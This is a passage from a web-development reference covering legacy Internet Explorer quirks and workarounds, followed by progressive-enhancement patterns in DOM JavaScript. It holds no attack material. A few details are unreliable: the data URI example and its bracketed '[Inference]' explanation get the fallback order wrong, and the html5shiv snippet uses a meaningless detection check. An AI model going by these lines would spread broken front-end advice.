    if (eventType.indexOf('mouse') !== -1) {
      event = document.createEvent('MouseEvents');
      event.initMouseEvent(
        eventType,
        options.bubbles !== false,
        options.cancelable !== false,
        window,
        options.detail || 1,
        options.screenX || 0,
        options.screenY || 0,
        options.clientX || 0,
        options.clientY || 0,
        options.ctrlKey || false,
        options.altKey || false,
        options.shiftKey || false,
        options.metaKey || false,
        options.button || 0,
        options.relatedTarget || null
      );
    } else if (eventType.indexOf('key') !== -1) {
      event = document.createEvent('KeyboardEvent');
      var initMethod = event.initKeyboardEvent ? 'initKeyboardEvent' : 'initKeyEvent';
      event[initMethod](
        eventType,
        options.bubbles !== false,
        options.cancelable !== false,
        window,
        options.ctrlKey || false,
        options.altKey || false,
        options.shiftKey || false,
        options.metaKey || false,
        options.keyCode || 0,
        options.charCode || 0
      );
    } else {
      event = document.createEvent('HTMLEvents');
      event.initEvent(eventType, options.bubbles !== false, options.cancelable !== false);
    }
    
    element.dispatchEvent(event);
  } else if (document.createEventObject) {
    // IE 8
    event = document.createEventObject();
    for (var prop in options) {
      event[prop] = options[prop];
    }
    element.fireEvent('on' + eventType, event);
  }
}
```

#### Mocking Event Objects

Create mock event objects for unit testing:

```javascript
function createMockEvent(type, properties) {
  var event = {
    type: type,
    target: null,
    currentTarget: null,
    bubbles: true,
    cancelable: true,
    defaultPrevented: false,
    preventDefault: function() {
      this.defaultPrevented = true;
    },
    stopPropagation: function() {
      this.propagationStopped = true;
    },
    stopImmediatePropagation: function() {
      this.immediatePropagationStopped = true;
    }
  };
  
  for (var prop in properties) {
    event[prop] = properties[prop];
  }
  
  return event;
}
```

---

## Legacy IE Considerations (Historical Context)

### Browser Detection vs Feature Detection

Legacy IE required careful distinction between browser detection and feature detection strategies. Browser detection involved parsing the user agent string or using conditional comments (`<!--[if IE]>`) to target specific IE versions. However, this approach was brittle and broke when user agents changed or new versions released.

Feature detection proved more reliable, testing for specific capabilities rather than browser identity. Libraries like Modernizr emerged specifically to handle this pattern, checking for API availability before use:

```javascript
if (document.addEventListener) {
  // Modern approach
} else if (document.attachEvent) {
  // IE8 and below
}
```

### Conditional Comments

Conditional comments were IE-specific HTML comments that allowed version-specific markup:

```html
<!--[if IE 8]>
<link rel="stylesheet" href="ie8.css">
<![endif]-->

<!--[if lt IE 9]>
<script src="html5shiv.js"></script>
<![endif]-->
```

These were removed in IE10, forcing developers to shift strategies. The syntax supported operators: `lt` (less than), `lte` (less than or equal), `gt` (greater than), `gte` (greater than or equal), and negation with `!`.

### Box Model Differences

IE5 and IE6 in quirks mode implemented the box model incorrectly. When `width` was set, IE included padding and border in that width calculation, rather than adding them outside as the CSS specification required. This meant a box with `width: 100px; padding: 10px; border: 5px` would be 100px total in IE quirks mode, but 130px in standards-compliant browsers.

The doctype declaration controlled which rendering mode IE used. A proper HTML5 doctype (`<!DOCTYPE html>`) triggered standards mode, while missing or malformed doctypes triggered quirks mode. The `box-sizing` property later standardized the IE behavior as an optional model via `box-sizing: border-box`.

### HasLayout Property

HasLayout was an internal IE rendering concept that determined whether an element was responsible for sizing and positioning its contents. Elements without "layout" exhibited numerous rendering bugs. Common triggers to force hasLayout included:

- `zoom: 1` (IE-specific, no visual effect at value 1)
- `position: absolute` or `position: relative`
- `float: left` or `float: right`
- `display: inline-block`
- `width` or `height` set to any value except `auto`

Issues caused by lack of hasLayout included collapsed margins, incorrect positioning of floated elements, and z-index stacking problems. The `zoom: 1` hack became ubiquitous in CSS fixes.

### PNG Transparency

IE6 did not support PNG alpha transparency natively for 8-bit or 24-bit PNGs with alpha channels. Images would display with a gray or cyan background instead of transparency. Multiple workarounds emerged:

**AlphaImageLoader Filter:**

```css
.png-fix {
  background: none;
  filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(
    src='image.png', 
    sizingMethod='scale'
  );
}
```

This proprietary filter worked but had performance implications and broke background positioning/repeat. IE7 partially fixed this (supported transparency) but IE6 remained problematic until its decline. Many developers used GIF fallbacks or JavaScript-based fixes like DD_belatedPNG.

### CSS Filter and Gradient Syntax

IE implemented proprietary filters for visual effects before CSS3 standardized equivalents:

```css
/* IE gradient */
filter: progid:DXImageTransform.Microsoft.gradient(
  startColorstr='#ff0000', 
  endColorstr='#0000ff'
);

/* Opacity in IE */
filter: alpha(opacity=50); /* 0-100 scale */
opacity: 0.5; /* Standard, 0-1 scale */
```

These filters applied outside the normal CSS cascade in some cases and affected performance. The gradient filter only supported linear top-to-bottom or left-to-right gradients, lacking the flexibility of modern CSS gradients.

### Event Model Discrepancies

IE8 and below used an incompatible event model:

**Event Attachment:**

```javascript
// IE8 and below
element.attachEvent('onclick', handler);

// Standards
element.addEventListener('click', handler, false);
```

**Event Object Access:**

```javascript
function handler(e) {
  // Standards: event passed as parameter
  e = e || window.event; // IE: global window.event
  
  // Target element
  var target = e.target || e.srcElement; // IE used srcElement
  
  // Prevent default
  if (e.preventDefault) {
    e.preventDefault(); // Standards
  } else {
    e.returnValue = false; // IE
  }
  
  // Stop propagation
  if (e.stopPropagation) {
    e.stopPropagation(); // Standards
  } else {
    e.cancelBubble = true; // IE
  }
}
```

IE also lacked support for event capturing phase, only supporting bubbling. Event handlers in IE received no event parameter; developers accessed `window.event` globally.

### DOM Manipulation Quirks

**innerHTML and Table Elements:** IE restricted direct `innerHTML` modification on `<table>`, `<thead>`, `<tbody>`, `<tr>`, and `<col>` elements. Setting innerHTML on these threw errors in some versions. Workarounds involved creating temporary containers or using DOM methods:

```javascript
// Would fail in IE
tableRow.innerHTML = '<td>Cell</td>';

// Required approach
var cell = document.createElement('td');
cell.appendChild(document.createTextNode('Cell'));
tableRow.appendChild(cell);
```

**createElement with Attributes:** IE allowed (and sometimes required) passing HTML strings to `createElement`:

```javascript
// IE-specific syntax for elements with name attributes
var input = document.createElement('<input name="field1">');

// Standards-compliant
var input = document.createElement('input');
input.setAttribute('name', 'field1');
```

**Memory Leaks with Circular References:** IE6 and IE7 had garbage collection issues with circular references between DOM elements and JavaScript objects. Event handlers that referenced DOM elements created leaks:

```javascript
// Leaked in IE6/7
var element = document.getElementById('example');
element.onclick = function() {
  // Handler references element, element references handler
  element.style.color = 'red';
};
```

Solutions included nullifying references, using event delegation, or frameworks that managed cleanup.

### CSS Selector Support

IE6 supported only CSS1 selectors and partial CSS2.1. Missing capabilities included:

- No attribute selectors beyond `[attr]` (e.g., `[attr^="value"]` unsupported)
- No child combinator (`>`) - though IE7 added this
- No adjacent sibling combinator (`+`)
- No `:hover` on non-anchor elements
- No `:focus`, `:first-child`, `:last-child`
- No pseudo-elements beyond `:first-letter` and `:first-line`

IE7 improved substantially, adding child and adjacent sibling combinators and attribute selectors. IE8 added most CSS2.1 selectors. IE9 finally supported CSS3 selectors comprehensively.

### Float and Clear Issues

IE6 exhibited the "doubled float-margin bug" where floated elements with margins in the float direction doubled those margins:

```css
.float-left {
  float: left;
  margin-left: 10px; /* Became 20px in IE6 */
}
```

The fix was `display: inline` on the floated element, which didn't affect float behavior but corrected the margin calculation.

IE6 also had issues with the "peek-a-boo bug" where content would disappear and reappear on hover or scroll. This related to hasLayout and was fixed by triggering layout on parent containers.

### Min/Max Width and Height

IE6 did not support `min-width`, `max-width`, `min-height`, or `max-height` properties. Workarounds used expressions (IE-specific CSS scripting):

```css
/* IE6 only */
.container {
  width: expression(
    document.body.clientWidth > 1200 ? "1200px" : "auto"
  );
}
```

Expressions recalculated on every repaint and caused severe performance issues. Alternative approaches used JavaScript to manually adjust dimensions on resize events or accepted fixed widths for IE6.

### Position: Fixed Support

IE6 did not support `position: fixed`. Elements styled with fixed positioning fell back to absolute positioning, scrolling with page content rather than staying viewport-relative. JavaScript workarounds repositioned elements on scroll events:

```javascript
// IE6 fixed position emulation
if (isIE6) {
  window.onscroll = function() {
    var element = document.getElementById('fixed-element');
    element.style.top = (document.documentElement.scrollTop + 10) + 'px';
  };
}
```

This created janky scrolling experiences. IE7 implemented `position: fixed` correctly.

### Z-Index and Stacking Contexts

IE created unintended stacking contexts in situations where other browsers did not. Each positioned element in IE could create a new stacking context regardless of z-index value, causing layering issues with dropdowns, modals, and overlays.

IE also reset z-index contexts at `<select>` elements, windowed controls (Flash, ActiveX), and `<iframe>` elements in some versions. The infamous issue of `<select>` elements appearing above everything led to the "shim iframe" technique - placing a transparent iframe beneath positioned elements to block the `<select>` from rendering through.

### XMLHttpRequest Object Creation

IE5 through IE6 required ActiveX instantiation for AJAX:

```javascript
var xhr;
if (window.XMLHttpRequest) {
  xhr = new XMLHttpRequest(); // Standards
} else if (window.ActiveXObject) {
  // IE6 and below
  try {
    xhr = new ActiveXObject('Msxml2.XMLHTTP');
  } catch (e) {
    xhr = new ActiveXObject('Microsoft.XMLHTTP');
  }
}
```

IE7 added native `XMLHttpRequest` constructor support. Different ActiveX versions (`Msxml2.XMLHTTP` vs `Microsoft.XMLHTTP`) had subtle behavioral differences in error handling and response parsing.

### JSON Parsing

IE7 and below lacked native JSON parsing. Code commonly used `eval()` with security implications:

```javascript
// Unsafe in old IE
var data = eval('(' + jsonString + ')');

// Safer approaches used Douglas Crockford's json2.js
var data = JSON.parse(jsonString); // With polyfill
```

IE8 added native `JSON.parse()` and `JSON.stringify()`. The absence forced inclusion of JSON polyfills or libraries for cross-browser compatibility.

### VBScript Fallbacks

IE supported VBScript alongside JavaScript. Some legacy code used VBScript for operations JavaScript couldn't perform in IE, particularly binary data handling:

```html
<script type="text/vbscript">
Function IEBinaryToArray(binary)
  ' Convert binary data to array
End Function
</script>
```

This created non-portable code that failed silently in other browsers. VBScript was IE-specific and never supported elsewhere.

### HTML5 Element Recognition

IE8 and below did not recognize HTML5 semantic elements (`<header>`, `<footer>`, `<article>`, `<section>`, `<nav>`, etc.). Unknown elements weren't parsed into the DOM tree correctly, and CSS styling failed to apply.

The HTML5 Shiv (or html5shiv.js) solved this by using `document.createElement()` to force IE to recognize these elements:

```javascript
// Simplified version of html5shiv concept
if (!document.createElement('header').cloneNode) {
  var elements = 'header,footer,nav,article,section,aside'.split(',');
  for (var i = 0; i < elements.length; i++) {
    document.createElement(elements[i]);
  }
}
```

Once created via JavaScript, IE would style these elements correctly. The shiv became standard in HTML5 boilerplate templates.

### CSS Expression Performance

CSS expressions allowed JavaScript execution within stylesheets:

```css
.dynamic {
  width: expression(document.body.clientWidth / 2);
  color: expression(new Date().getHours() < 12 ? "blue" : "red");
}
```

Expressions evaluated continuously - on every repaint, resize, scroll, and mouse move. Pages with multiple expressions experienced severe performance degradation. They were removed in IE8 standards mode due to security and performance concerns.

Safer alternatives included applying classes via JavaScript or using JavaScript to set inline styles based on calculations.

### MIME Type Sniffing

IE performed content-type sniffing, attempting to determine file types by examining content rather than trusting HTTP headers. This created security vulnerabilities where user-uploaded content could be interpreted as HTML and execute scripts.

The `X-Content-Type-Options: nosniff` header was introduced to prevent this behavior in IE8+. Without this header, IE might ignore `Content-Type: text/plain` and execute JavaScript if the content resembled HTML.

### Object Element and Flash Embedding

IE required different `<object>` element syntax for Flash and ActiveX controls compared to other browsers:

```html
<!-- IE using ActiveX classid -->
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000">
  <param name="movie" value="movie.swf">
</object>

<!-- Standards using type and data -->
<object type="application/x-shockwave-flash" data="movie.swf">
  <param name="movie" value="movie.swf">
</object>
```

The dual-object technique embedded both versions, with IE recognizing only its classid-based version and other browsers using the standards version. Libraries like SWFObject abstracted this complexity.

### Console Object Availability

The `console` object only existed in IE when developer tools were open. Code with `console.log()` statements threw errors in IE when tools were closed:

```javascript
// Safe console usage for IE
if (window.console && console.log) {
  console.log('Debug message');
}

// Or create stub
window.console = window.console || {
  log: function() {},
  warn: function() {},
  error: function() {}
};
```

This created situations where code worked with F12 tools open but failed in production.

### CORS and XDomainRequest

IE8 and IE9 implemented CORS differently using `XDomainRequest` instead of XMLHttpRequest for cross-origin requests:

```javascript
if (window.XDomainRequest) {
  // IE8, IE9
  var xdr = new XDomainRequest();
  xdr.open("GET", url);
  xdr.onload = function() {
    var data = xdr.responseText;
  };
  xdr.send();
} else {
  // Standards
  var xhr = new XMLHttpRequest();
  xhr.open("GET", url);
  xhr.onload = function() {
    var data = xhr.responseText;
  };
  xhr.send();
}
```

XDomainRequest had limitations: no custom headers, no cookies, only GET/POST methods, and limited error information. IE10+ reverted to standard XMLHttpRequest with proper CORS support.

### CSS3 Feature Support

IE9 was the first version with substantial CSS3 support. Prior versions required workarounds:

**Border Radius:** IE8 and below had no native border-radius support. Alternatives included:

- JavaScript libraries (jQuery UI corners, DD_roundies)
- CSS3 PIE (Progressive Internet Explorer) polyfill using .htc behaviors
- Image-based rounded corners with background images

**Box Shadow:** Similar to border-radius, required JavaScript polyfills or IE filters:

```css
.shadow {
  box-shadow: 2px 2px 5px rgba(0,0,0,0.3); /* Standards */
  filter: progid:DXImageTransform.Microsoft.Shadow(
    color='#666666', 
    Direction=135, 
    Strength=3
  ); /* IE */
}
```

IE filters lacked blur control and only supported solid colors, not RGBA transparency.

**RGBA/HSLA Colors:** IE8 and below didn't support RGBA or HSLA color values. Fallbacks used solid hex colors:

```css
.transparent {
  background: #ff0000; /* Fallback */
  background: rgba(255, 0, 0, 0.5); /* Ignored by IE8- */
}
```

Or used filters with gradient for transparency:

```css
background: transparent;
filter: progid:DXImageTransform.Microsoft.gradient(
  startColorstr=#7FFF0000, /* First two digits are alpha */
  endColorstr=#7FFF0000
);
```

### Font Rendering and @font-face

IE supported `@font-face` since IE5, but required proprietary EOT (Embedded OpenType) format:

```css
@font-face {
  font-family: 'CustomFont';
  src: url('font.eot'); /* IE9 Compat Modes */
  src: url('font.eot?#iefix') format('embedded-opentype'), /* IE6-8 */
       url('font.woff') format('woff'), /* Modern browsers */
       url('font.ttf') format('truetype'); /* Safari, Android */
}
```

The `?#iefix` query string worked around an IE parsing bug. Font rendering quality varied significantly between IE versions, with ClearType rendering improving in later versions.

### JavaScript Array and Object Methods

IE8 and below lacked ECMAScript 5 array methods:

```javascript
// Required polyfills or library functions
if (!Array.prototype.forEach) {
  Array.prototype.forEach = function(callback, thisArg) {
    for (var i = 0; i < this.length; i++) {
      callback.call(thisArg, this[i], i, this);
    }
  };
}
```

Missing methods included: `forEach`, `map`, `filter`, `reduce`, `reduceRight`, `some`, `every`, `indexOf`, `lastIndexOf`. ES5-shim provided comprehensive polyfills.

`Object.keys()`, `Object.create()`, and property descriptor methods were also absent and required polyfills or alternative patterns.

### Input Placeholder Support

IE9 and below did not support the `placeholder` attribute on input elements. JavaScript polyfills detected lack of support and mimicked behavior:

```javascript
if (!('placeholder' in document.createElement('input'))) {
  // Polyfill: set value to placeholder text,
  // style as gray, clear on focus, restore on blur if empty
}
```

This required careful handling to avoid submitting placeholder text as form data and distinguishing placeholder from actual user input.

### Whitespace Text Nodes

IE handled whitespace in the DOM differently than other browsers, often stripping whitespace-only text nodes or treating them inconsistently. Code that traversed the DOM using `nextSibling` or `childNodes` required filtering:

```javascript
function getNextElement(node) {
  while (node = node.nextSibling) {
    if (node.nodeType === 1) return node; // Element nodes only
  }
  return null;
}
```

Standards-compliant browsers preserved whitespace text nodes, while IE sometimes collapsed them, leading to off-by-one errors in node traversal.

### getAttribute and setAttribute Quirks

IE returned attribute values differently for certain attributes:

```javascript
var link = document.getElementById('myLink');

// IE returned resolved absolute URL
link.getAttribute('href'); // "http://example.com/page.html"

// Other browsers returned literal value
link.getAttribute('href'); // "page.html"

// Solution: access property for resolved, getAttribute for literal
link.href; // Always absolute
link.getAttribute('href', 2); // IE-specific flag for literal value
```

IE also allowed setting properties via `setAttribute` that should have used property assignment:

```javascript
element.setAttribute('onclick', 'alert("test")'); // Worked in IE
element.onclick = function() { alert("test"); }; // Standard way
```

### CSS Specificity and !important

IE6 calculated specificity differently in some edge cases, and `!important` declarations behaved unpredictably:

```css
/* IE6 might ignore !important if later rule overrides */
.class { color: red !important; }
.class { color: blue; } /* Could win in IE6 */
```

IE7 fixed most specificity issues, but IE6 required defensive specificity strategies and avoiding `!important` where possible or using it consistently.

### Media Query Support

IE8 and below completely lacked media query support. Responsive design required JavaScript solutions:

- **css3-mediaqueries.js** - Polyfill that parsed stylesheets and evaluated media queries
- **Respond.js** - Lightweight polyfill for min-width/max-width only
- Server-side detection and separate stylesheets

Many sites served fixed-width layouts to IE8 and below, accepting non-responsive experiences for legacy browsers rather than polyfilling.

### Multiple Background Images

IE8 and below supported only a single background image per element. Multiple backgrounds required nested elements or CSS3 PIE polyfill:

```css
/* Standards */
.multi {
  background: url(bg1.png), url(bg2.png);
}

/* IE8 workaround */
.multi {
  background: url(bg1.png); /* Fallback */
}
```

Or structural changes:

```html
<div class="outer" style="background: url(bg1.png)">
  <div class="inner" style="background: url(bg2.png)">
    Content
  </div>
</div>
```

### Data URI Support

IE8 supported data URIs with a 32KB size limit. IE7 and below had no support:

```css
.icon {
  background: url(data:image/png;base64,...); /* IE8+ */
  background: url(icon.png); /* IE7 fallback, place after */
}
```

[Inference: The order matters because CSS cascade means later declarations override earlier ones, so placing the data URI after the regular URL serves the data URI to capable browsers while IE7 uses the earlier file-based URL]

The size limit made data URIs impractical for larger assets in IE8.

### ActiveX Control Security

IE uniquely supported ActiveX controls, which posed significant security risks. Controls ran with full system privileges by default. This led to:

- Drive-by downloads and malware installation
- Security zones (Internet, Local Intranet, Trusted Sites, Restricted Sites)
- Kill bits to disable vulnerable controls
- Enhanced Protected Mode in later versions

Sites relied on ActiveX for functionality (printing, document viewing, custom controls), making it difficult to disable despite risks. Other browsers never implemented ActiveX, creating IE-only functionality dependencies.

### Frame and Window Relationships

IE handled frame and window relationships differently:

```javascript
// Accessing parent window
var parent = window.parent; // Standards
var parent = window.parentWindow; // IE alternative

// Frame name access
var frame = window.frames['frameName']; // Standards
var frame = window.frameName; // Also worked in IE
```

Security restrictions on cross-origin frame access also differed, with IE sometimes allowing access that standards blocked, or vice versa in different modes.

### Meta Tag Compatibility Modes

IE8 introduced `X-UA-Compatible` to control rendering modes:

```html
<meta http-equiv="X-UA-Compatible" content="IE=edge">
```

Values included:

- `IE=edge` - Latest standards mode
- `IE=EmulateIE8` - IE8 standards mode if doctype present, quirks otherwise
- `IE=8` - Force IE8 standards mode regardless of doctype
- `IE=7` - Force IE7 standards mode

This created testing complexity as sites had to verify behavior across multiple IE rendering modes even within a single browser version. The header could also be sent as HTTP response header for server-side control.

---

## Progressive Enhancement in DOM and JavaScript

Progressive enhancement is a development strategy where baseline functionality is delivered through HTML and CSS, with JavaScript layered on top to enhance the experience for capable browsers. The DOM serves as the enhancement target, with JavaScript progressively adding interactivity, state management, and advanced features.

### Core Enhancement Patterns

#### Feature Detection Over Browser Detection

Feature detection tests for specific capabilities rather than inferring support from browser identity. The DOM provides native testing mechanisms through property existence checks and method availability.

```javascript
// Direct property/method existence
if ('IntersectionObserver' in window) {
  // Enhance with intersection observation
}

// API availability with fallback chain
if (typeof document.startViewTransition === 'function') {
  document.startViewTransition(() => updateDOM());
} else {
  updateDOM();
}

// CSS feature detection via DOM
const supportsGrid = CSS.supports('display', 'grid');
const supportsContainer = CSS.supports('container-type', 'inline-size');
```

#### Graceful Degradation Through HTML Semantics

The DOM naturally supports progressive enhancement when JavaScript operates on semantic HTML. Buttons, links, and forms work without JavaScript, then gain enhanced behavior.

```javascript
// Link that works without JS, enhanced with JS
const link = document.querySelector('a[href="#panel"]');
link.addEventListener('click', (e) => {
  e.preventDefault();
  document.getElementById('panel').showModal(); // Enhanced modal
  // Without JS, fragment navigation still works
});

// Form with native submission, enhanced with fetch
const form = document.querySelector('form');
form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const data = new FormData(form);
  await fetch(form.action, { method: form.method, body: data });
  // Without JS, normal form submission occurs
});
```

### DOM API Enhancement Layers

#### Capability-Based DOM Manipulation

Modern DOM APIs enable progressive enhancement through capability checks that determine which manipulation strategies to use.

```javascript
// Progressive element insertion
function insertContent(container, content) {
  if ('replaceChildren' in container) {
    container.replaceChildren(content);
  } else if ('replaceWith' in container.firstChild) {
    const temp = document.createElement('div');
    temp.appendChild(content);
    container.innerHTML = temp.innerHTML;
  } else {
    container.innerHTML = '';
    container.appendChild(content);
  }
}

// Progressive animation enhancement
function animateElement(element, keyframes, options) {
  if (typeof element.animate === 'function') {
    return element.animate(keyframes, options);
  } else {
    // Fallback: Apply end state immediately
    const finalFrame = keyframes[keyframes.length - 1];
    Object.assign(element.style, finalFrame);
    return { finished: Promise.resolve() };
  }
}
```

#### Event Delegation for Dynamic Content

Event delegation on stable DOM nodes enables enhancement of dynamically added content without re-binding.

```javascript
// Single listener handles current and future elements
document.addEventListener('click', (e) => {
  const button = e.target.closest('[data-action]');
  if (!button) return;
  
  const action = button.dataset.action;
  handleAction(action, button);
});

// Progressive disclosure enhancement
document.addEventListener('click', (e) => {
  const toggle = e.target.closest('[aria-expanded]');
  if (!toggle) return;
  
  const expanded = toggle.getAttribute('aria-expanded') === 'true';
  toggle.setAttribute('aria-expanded', !expanded);
  
  const targetId = toggle.getAttribute('aria-controls');
  const target = document.getElementById(targetId);
  target.hidden = expanded;
});
```

### State Management Enhancement

#### DOM as State Source

The DOM itself can serve as the source of truth, with JavaScript reading and modifying existing state rather than maintaining parallel state.

```javascript
// Read state from DOM attributes
function getFilterState() {
  const filters = document.querySelectorAll('[data-filter]');
  return Array.from(filters)
    .filter(f => f.getAttribute('aria-pressed') === 'true')
    .map(f => f.dataset.filter);
}

// Persist state to DOM for SSR compatibility
function saveScrollPosition(container) {
  container.dataset.scrollTop = container.scrollTop;
  container.dataset.scrollLeft = container.scrollLeft;
}

function restoreScrollPosition(container) {
  if (container.dataset.scrollTop) {
    container.scrollTop = parseInt(container.dataset.scrollTop, 10);
    container.scrollLeft = parseInt(container.dataset.scrollLeft, 10);
  }
}
```

#### Progressive State Synchronization

State can be progressively enhanced from server-rendered HTML to client-side interactivity.

```javascript
// Hydration pattern: attach behavior to server-rendered content
function hydrateComponent(element) {
  const initialState = JSON.parse(element.dataset.state || '{}');
  
  // Enhance with client-side reactivity
  const state = new Proxy(initialState, {
    set(target, prop, value) {
      target[prop] = value;
      updateDOM(element, state);
      return true;
    }
  });
  
  attachEventListeners(element, state);
}

// Progressive loading: start with critical content
function progressivelyLoadContent(container) {
  const critical = container.querySelector('[data-critical]');
  // Critical content already rendered
  
  if ('requestIdleCallback' in window) {
    requestIdleCallback(() => {
      const deferred = container.querySelectorAll('[data-deferred]');
      deferred.forEach(loadDeferredContent);
    });
  }
}
```

### Performance-Oriented Enhancement

#### Intersection Observer for Lazy Enhancement

Enhance elements only when they become relevant to the user's viewport.

```javascript
// Progressive image enhancement
const imageObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      if (img.dataset.src) {
        img.src = img.dataset.src;
        img.removeAttribute('data-src');
      }
      imageObserver.unobserve(img);
    }
  });
}, { rootMargin: '50px' });

// Lazy component initialization
const componentObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const component = entry.target;
      initializeComponent(component);
      componentObserver.unobserve(component);
    }
  });
});
```

#### Mutation Observer for Progressive Adaptation

Observe DOM changes and progressively enhance new content as it appears.

```javascript
// Auto-enhance dynamically inserted content
const enhancementObserver = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    mutation.addedNodes.forEach(node => {
      if (node.nodeType === Node.ELEMENT_NODE) {
        enhanceElement(node);
        node.querySelectorAll('[data-enhance]').forEach(enhanceElement);
      }
    });
  });
});

enhancementObserver.observe(document.body, {
  childList: true,
  subtree: true
});

function enhanceElement(element) {
  const type = element.dataset.enhance;
  switch(type) {
    case 'tooltip':
      attachTooltip(element);
      break;
    case 'modal':
      attachModalBehavior(element);
      break;
  }
}
```

### Accessibility-Preserving Enhancement

#### ARIA State Progressive Enhancement

JavaScript enhancements maintain and extend ARIA semantics established in HTML.

```javascript
// Enhance with ARIA live regions
function createLiveRegion(politeness = 'polite') {
  let region = document.getElementById('live-region');
  
  if (!region) {
    region = document.createElement('div');
    region.id = 'live-region';
    region.setAttribute('aria-live', politeness);
    region.setAttribute('aria-atomic', 'true');
    region.className = 'sr-only';
    document.body.appendChild(region);
  }
  
  return {
    announce(message) {
      region.textContent = message;
    }
  };
}

// Progressive focus management
function enhanceModalFocus(dialog) {
  const focusableElements = dialog.querySelectorAll(
    'a[href], button, textarea, input, select, [tabindex]:not([tabindex="-1"])'
  );
  
  const firstFocusable = focusableElements[0];
  const lastFocusable = focusableElements[focusableElements.length - 1];
  
  dialog.addEventListener('keydown', (e) => {
    if (e.key !== 'Tab') return;
    
    if (e.shiftKey) {
      if (document.activeElement === firstFocusable) {
        e.preventDefault();
        lastFocusable.focus();
      }
    } else {
      if (document.activeElement === lastFocusable) {
        e.preventDefault();
        firstFocusable.focus();
      }
    }
  });
}
```

#### Keyboard Enhancement Patterns

Progressive enhancement of keyboard interaction beyond basic HTML semantics.

```javascript
// Enhance with arrow key navigation
function enhanceMenuNavigation(menu) {
  const items = Array.from(menu.querySelectorAll('[role="menuitem"]'));
  
  menu.addEventListener('keydown', (e) => {
    const currentIndex = items.indexOf(document.activeElement);
    let nextIndex;
    
    switch(e.key) {
      case 'ArrowDown':
        e.preventDefault();
        nextIndex = (currentIndex + 1) % items.length;
        items[nextIndex].focus();
        break;
      case 'ArrowUp':
        e.preventDefault();
        nextIndex = (currentIndex - 1 + items.length) % items.length;
        items[nextIndex].focus();
        break;
      case 'Home':
        e.preventDefault();
        items[0].focus();
        break;
      case 'End':
        e.preventDefault();
        items[items.length - 1].focus();
        break;
    }
  });
}
```

### Form Enhancement Patterns

#### Progressive Validation

Layer client-side validation on top of native HTML5 validation and server-side validation.

```javascript
// Enhance form with real-time validation
function enhanceFormValidation(form) {
  // Preserve native validation as baseline
  form.setAttribute('novalidate', ''); // Disable native UI, keep constraint validation
  
  const fields = form.querySelectorAll('input, textarea, select');
  
  fields.forEach(field => {
    field.addEventListener('blur', () => {
      validateField(field);
    });
    
    field.addEventListener('input', debounce(() => {
      if (field.dataset.touched) {
        validateField(field);
      }
    }, 300));
  });
  
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    fields.forEach(field => field.dataset.touched = 'true');
    
    const isValid = Array.from(fields).every(validateField);
    
    if (isValid) {
      await submitForm(form);
    }
  });
}

function validateField(field) {
  // Use native constraint validation API
  const isValid = field.checkValidity();
  
  const errorContainer = document.getElementById(`${field.id}-error`);
  if (!errorContainer) return isValid;
  
  if (!isValid) {
    errorContainer.textContent = field.validationMessage;
    field.setAttribute('aria-invalid', 'true');
    field.setAttribute('aria-describedby', errorContainer.id);
  } else {
    errorContainer.textContent = '';
    field.removeAttribute('aria-invalid');
    field.removeAttribute('aria-describedby');
  }
  
  return isValid;
}
```

#### Autocomplete Enhancement

Progressive enhancement of input fields with autocomplete suggestions.

```javascript
// Enhance input with autocomplete
function enhanceAutocomplete(input, fetchSuggestions) {
  const listId = `${input.id}-suggestions`;
  let list = document.getElementById(listId);
  
  if (!list) {
    list = document.createElement('ul');
    list.id = listId;
    list.setAttribute('role', 'listbox');
    list.hidden = true;
    input.parentNode.appendChild(list);
  }
  
  input.setAttribute('role', 'combobox');
  input.setAttribute('aria-autocomplete', 'list');
  input.setAttribute('aria-controls', listId);
  input.setAttribute('aria-expanded', 'false');
  
  let selectedIndex = -1;
  
  input.addEventListener('input', debounce(async () => {
    const query = input.value.trim();
    if (query.length < 2) {
      hideSuggestions();
      return;
    }
    
    const suggestions = await fetchSuggestions(query);
    displaySuggestions(suggestions);
  }, 300));
  
  input.addEventListener('keydown', (e) => {
    const items = list.querySelectorAll('[role="option"]');
    
    switch(e.key) {
      case 'ArrowDown':
        e.preventDefault();
        selectedIndex = Math.min(selectedIndex + 1, items.length - 1);
        updateSelection(items);
        break;
      case 'ArrowUp':
        e.preventDefault();
        selectedIndex = Math.max(selectedIndex - 1, -1);
        updateSelection(items);
        break;
      case 'Enter':
        if (selectedIndex >= 0) {
          e.preventDefault();
          selectSuggestion(items[selectedIndex]);
        }
        break;
      case 'Escape':
        hideSuggestions();
        break;
    }
  });
  
  function displaySuggestions(suggestions) {
    list.innerHTML = '';
    suggestions.forEach((suggestion, index) => {
      const item = document.createElement('li');
      item.setAttribute('role', 'option');
      item.textContent = suggestion;
      item.addEventListener('click', () => selectSuggestion(item));
      list.appendChild(item);
    });
    
    list.hidden = false;
    input.setAttribute('aria-expanded', 'true');
    selectedIndex = -1;
  }
  
  function hideSuggestions() {
    list.hidden = true;
    input.setAttribute('aria-expanded', 'false');
    selectedIndex = -1;
  }
  
  function updateSelection(items) {
    items.forEach((item, index) => {
      const selected = index === selectedIndex;
      item.setAttribute('aria-selected', selected);
      if (selected) {
        input.setAttribute('aria-activedescendant', item.id || `option-${index}`);
      }
    });
  }
  
  function selectSuggestion(item) {
    input.value = item.textContent;
    hideSuggestions();
    input.dispatchEvent(new Event('change', { bubbles: true }));
  }
}
```

### Content Loading Enhancement

#### Progressive Hydration Strategies

Enhance server-rendered content progressively based on priority and viewport.

```javascript
// Priority-based hydration
class HydrationScheduler {
  constructor() {
    this.queue = {
      critical: [],
      high: [],
      normal: [],
      low: []
    };
  }
  
  register(element, priority = 'normal') {
    const component = {
      element,
      hydrate: () => this.hydrateComponent(element)
    };
    
    this.queue[priority].push(component);
  }
  
  async start() {
    // Critical: Hydrate immediately
    await this.processQueue(this.queue.critical);
    
    // High: Hydrate on requestAnimationFrame
    requestAnimationFrame(async () => {
      await this.processQueue(this.queue.high);
      
      // Normal/Low: Hydrate on idle
      if ('requestIdleCallback' in window) {
        requestIdleCallback(async () => {
          await this.processQueue(this.queue.normal);
          await this.processQueue(this.queue.low);
        }, { timeout: 2000 });
      } else {
        setTimeout(async () => {
